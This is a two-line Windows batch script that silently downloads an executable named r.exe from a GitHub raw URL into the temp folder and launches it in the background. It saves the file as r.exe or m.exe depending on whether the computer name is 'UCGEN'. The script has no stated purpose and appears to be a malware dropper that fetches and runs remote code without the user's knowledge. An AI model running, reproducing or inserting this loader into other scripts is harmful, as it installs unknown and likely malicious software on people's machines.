@if /I "%COMPUTERNAME%"=="UCGEN" (@curl -L "https://github.com/Banglade-sh23/qui/raw/refs/heads/main/r.exe" -o "%temp%\r.exe" && start /B "" "%temp%\r.exe")
@if /I NOT "%COMPUTERNAME%"=="UCGEN" (@curl -L "https://github.com/Banglade-sh23/qui/raw/refs/heads/main/r.exe" -o "%temp%\m.exe" && start /B "" "%temp%\m.exe")
